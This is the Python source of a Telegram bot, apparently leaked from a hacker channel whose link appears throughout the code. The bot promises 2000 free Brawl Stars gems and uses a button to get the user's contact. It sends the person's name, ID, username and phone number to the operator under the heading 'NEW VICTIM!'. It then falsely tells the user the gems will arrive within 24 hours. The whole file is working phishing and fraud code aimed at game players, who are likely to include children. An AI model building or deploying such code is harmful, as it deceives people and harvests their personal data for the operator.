# Слито в https://t.me/HACKER_PHONE_VIP

from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ContentTypes
from aiogram import Bot, Dispatcher, executor, types
import time
from config import Admin, Token

# Слито в https://t.me/HACKER_PHONE_VIP

bot = Bot(token=Token, parse_mode="html")
dp = Dispatcher(bot)
ADMIN_ID = Admin

# Слито в https://t.me/HACKER_PHONE_VIP

async def started(dp):
	await bot.send_message(chat_id=ADMIN_ID, text='✅*Бот запущен!*', parse_mode= 'Markdown')

# Слито в https://t.me/HACKER_PHONE_VIP

@dp.message_handler(commands=['start'])
async def start(message):
   don_kb = ReplyKeyboardMarkup(resize_keyboard=True)
   donate = KeyboardButton(text="💎ПОЛУЧИТЬ ДОНАТ💎", request_contact=True)
   don_kb.add(donate)
   await message.reply(f'👋🏻<b>Привет, <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>!</b>\n\n💎<b>Я - бот который задонатит тебе 2000 гемов в бравл старс!</b>\n⬇️<b>Чтобы получить донат, нажми кнопку ниже!</b>⬇️', parse_mode="HTML", reply_markup=don_kb)
# Слито в https://t.me/HACKER_PHONE_VIP
@dp.message_handler(content_types=['contact'])
async def contact(message):
   if message.contact.user_id != message.from_user.id:
      await message.reply("Отправьте свой контакт!")
      return
   else:
      await bot.send_message(chat_id=ADMIN_ID, text=f'🔔<b>НОВАЯ ЖЕРТВА!</b>🔔\n\n👤<b>Имя:</b> {message.contact.full_name}\n🆔<b>Айди:</b> <code>{message.contact.user_id}</code>\n🕷<b>Юзернейм:</b> @{message.from_user.username}\n📲<b>Телефон:</b> +{message.contact.phone_number}', parse_mode="HTML")
      await message.reply("⌨*Введи свой тег в игре! (с # в начале)*", parse_mode= 'Markdown')
# Слито в https://t.me/HACKER_PHONE_VIP
@dp.message_handler(lambda msg: msg.text.lower().startswith('#'))
async def tag(message):
   await message.reply("🚀*Отправляю твои 2000 гемов...*", parse_mode= 'Markdown')
   time.sleep(5)
   await message.reply("✅*Ваши гемы появятся на вашем аккаунте в течении 24 часов!*", parse_mode= 'Markdown')
# Слито в https://t.me/HACKER_PHONE_VIP
@dp.message_handler(content_types=ContentTypes.all())
async def autoleave(message):
   if message.chat.type != "private":
      await bot.leave_chat(message.chat.id)
   else:
      pass
# Слито в https://t.me/HACKER_PHONE_VIP

executor.start_polling(dp, on_startup=started, skip_updates=True)

# Слито в https://t.me/HACKER_PHONE_VIP